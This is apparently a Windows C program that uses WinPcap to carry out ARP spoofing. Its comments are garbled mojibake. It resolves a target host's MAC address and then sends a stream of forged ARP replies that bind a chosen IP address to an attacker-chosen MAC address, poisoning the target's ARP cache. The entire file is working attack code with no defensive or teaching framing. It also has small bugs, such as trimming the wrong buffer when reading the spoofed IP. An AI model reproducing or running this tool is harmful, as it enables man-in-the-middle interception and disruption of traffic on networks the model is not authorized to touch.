/*
�������ƣ�ARP��ƭ����
*/

#define HAVE_REMOTE

#pragma pack(1)// �趨Ϊ1�ֽڶ��룬��Ȼpacket�������

#include <stdio.h>
#include <winsock2.h>  
#include <pcap.h>
#include "ARPSpoofing.h"

#pragma comment(lib, "wpcap.lib")
#pragma comment(lib, "ws2_32.lib")

int GetMacByIP(pcap_t *p, const char *ip, u_char mac[]);
int main(int argc, char* argv[])
{
	pcap_if_t *alldevs;			//��ȡ����ȫ������
	pcap_if_t *device;			//���ڱ���ȫ������
	pcap_t *adhandle;

	int i = 0, device_id = 0;
	char errbuf[PCAP_ERRBUF_SIZE] = {0};
	char sz_srcIP[17] = {0},sz_dstIP[17] = {0};
	PACKET packet;			//Ҫ���͵����ݰ�
	int pack_cnt = 100;		//Ĭ�Ϸ���100��ARP��ƭ��

	printf("Getting interface ......\n");
	if (-1 == pcap_findalldevs(&alldevs, errbuf))		//��ȡ�����ϵ�����
	{
		printf("Error in pcap_findalldevs: %s\n", errbuf);
		system("PAUSE");
		pcap_freealldevs(alldevs);		//�ͷ���Դ
		return 1;
	}

	//��ӡ�ҵ�����������������
	for (device =alldevs; device != NULL; device = device -> next)
	{
		printf("%2d. %s", ++i, device -> name);
		if (device -> description)
		{
			printf(" (%s)\n",device -> description);
		}
		else
		{
			printf(" (No decription available)\n");
		}
	}

	//û�ҵ�����
	if (i == 0)
	{
		printf("\nNo interface found! Please make sure WinPcap is installed.\n");
		system("PAUSE");
		pcap_freealldevs(alldevs);		//�ͷ���Դ
		return 1;
	}

	do				//����ѡ����������
	{
		printf("Please input NO. of interface you select (1 to %d): ", i);
		scanf("%d", &device_id);
		if (device_id > i)
		{
			printf("Error: Wrong NO.! Please make sure NO. ranges from 1 to %d\n", i);
		}
	} while (device_id > i);

	//ָ���ƶ���ѡ�������
	for(device = alldevs, i = 0; i < device_id-1; device = device -> next, i++);
	
	//������
	if (NULL == (adhandle = pcap_open(device -> name,	//������
										60,				//ֻ�������ݰ�ǰ60�ֽ�
										PCAP_OPENFLAG_PROMISCUOUS,	//����ģʽ
										1000,				//����ʱ��Ϊ1��
										NULL,				//Զ����֤Ϊ��
										errbuf				//������Ϣ
					)))
	{
		printf("\nUnable to open the adapter. %s is not supported by WinPcap\n", device -> name);
		pcap_freealldevs(alldevs);		//�ͷ���Դ
		system("PAUSE");
		return 1;
	}

	//������ƭ��IP��ַ
	printf("Please input IP address of the host you want to spoof(e.g. 192.168.1.1):\n");
	getchar();	//��������NO.��س�
	fgets(sz_dstIP, sizeof(sz_dstIP), stdin);	//����Ŀ��IP
	sz_dstIP[strlen(sz_dstIP)-1] = '\0';
	GetMacByIP(adhandle,sz_dstIP,packet.ethdr.eh_dst);	//��ȡĿ��IP��MAC��ַ
	//printf(packet.ethdr.eh_dst);

	//������Ҫαװ��IP��ַ
	printf("Please input IP address you want to pretend(e.g. 192.168.1.1):\n");
	fgets(sz_srcIP, sizeof(sz_srcIP), stdin);	//����Ҫαװ��IP
	sz_srcIP[strlen(sz_dstIP)-1]='\0';

	//������Ҫαװ��MAC��ַ
	printf("Please input MAC address you want to pretend(e.g. 01-23-45-67-89-ab):\n");
	scanf("%x-%x-%x-%x-%x-%x", &packet.ethdr.eh_src[0], &packet.ethdr.eh_src[1], &packet.ethdr.eh_src[2],
		&packet.ethdr.eh_src[3], &packet.ethdr.eh_src[4], &packet.ethdr.eh_src[5]);

	packet.ethdr.eh_type=htons(ETH_ARP);	//��̫֡����ΪARP����

	packet.arphdr.arp_htype=htons(ARP_HARDWARE);	//���ARPͷ
    packet.arphdr.arp_ptype=htons(ETH_IP);			//IPЭ��
    packet.arphdr.arp_hlen=6;						//Ӳ����ַ��Ϊ6�ֽ�
    packet.arphdr.arp_plen=4;						//IPЭ���ַ��Ϊ4�ֽ�
    packet.arphdr.arp_op=htons(ARP_REPLY);			//������ARP��Ӧ��
	memcpy(packet.arphdr.arp_sha,packet.ethdr.eh_src,6);	//ԴMAC��ַ����̫ͷ����ͬ
	packet.arphdr.arp_spa=inet_addr(sz_srcIP);		//ԴIP��ַ
	memcpy(packet.arphdr.arp_tha,packet.ethdr.eh_dst,6);	//Ŀ��MAC��ַ����̫ͷ����ͬ
	packet.arphdr.arp_tpa=inet_addr(sz_dstIP);		//Ŀ��IP��ַ	

	printf("Spoofing at %s has started. ",sz_dstIP);
	while (pack_cnt--)	//Ĭ�Ϸ���100��ARP��ƭ��
	{
		if (pcap_sendpacket(adhandle, (u_char*)&packet, sizeof(PACKET)) != 0)
		{
			printf("\nError in sending the packet: %s\n", pcap_geterr(adhandle));
			pcap_freealldevs(alldevs);		//�ͷ���Դ
			system("PAUSE");
			return 1;
		}
		printf("packet sending\n");
		Sleep(500);		//ÿ��500ms����һ�����ݰ�
	}
	printf("%s has been spoofed.\n ",sz_dstIP);
	pcap_freealldevs(alldevs);		//�ͷ���Դ
	system("PAUSE");
	return 0;
}

//����IP��ַ��ȡMAC��ַ
int GetMacByIP(pcap_t *p, const char *ip, u_char mac[])
{
	struct pcap_pkthdr * pkt_header;
    u_char * pkt_data; 
	unsigned char   sendbuf[42];
	int    i;
	ETHDR eth;
	ARPHDR arp;
   
	for(i = 0; i < ETHER_ADDR_LEN; i++)
    {
        eth.eh_dst[i] = 0xFF;			//�㲥����
        eth.eh_src[i]=0;				//Դ��ַ���Բ�д
        arp.arp_sha[i]=0;
        arp.arp_tha[i]=0x00;
    }
    eth.eh_type=htons(ETH_ARP);			//������ARP����

	arp.arp_htype=htons(ARP_HARDWARE);	//���ARP������ͷ
	arp.arp_ptype=htons(ETH_IP);
	arp.arp_hlen=6;
	arp.arp_plen=4;
	arp.arp_op=htons(ARP_REQUEST);
	arp.arp_spa=0;
	arp.arp_tpa=inet_addr(ip);
	memset(sendbuf,0,sizeof(sendbuf));
	memcpy(sendbuf,&eth,sizeof(eth));
	memcpy(sendbuf+sizeof(eth),&arp,sizeof(arp));
	if(pcap_sendpacket(p,sendbuf,42)!=0)
	{
		printf("Error in pcap_sendpacket!\n");
		return 1;
	}
	while((pcap_next_ex(p,&pkt_header,(const u_char**)&pkt_data))>0)	//�ػ�Ŀ��IP����Ӧ����
	{
		if(*(unsigned short *)(pkt_data+12)==htons(ETH_ARP)&&
			*(unsigned short*)(pkt_data+20)==htons(ARP_REPLY)&&
			*(unsigned long*)(pkt_data+28)==inet_addr(ip)&&
			*(unsigned long*)(pkt_data+38)==0)	//������Ҫ����Ӧ����
		{
			memcpy(mac,pkt_data+22,ETHER_ADDR_LEN);		//ƫ��22��λ����Ŀ��IP��MAC��ַ
		}
	}
	return 0;
}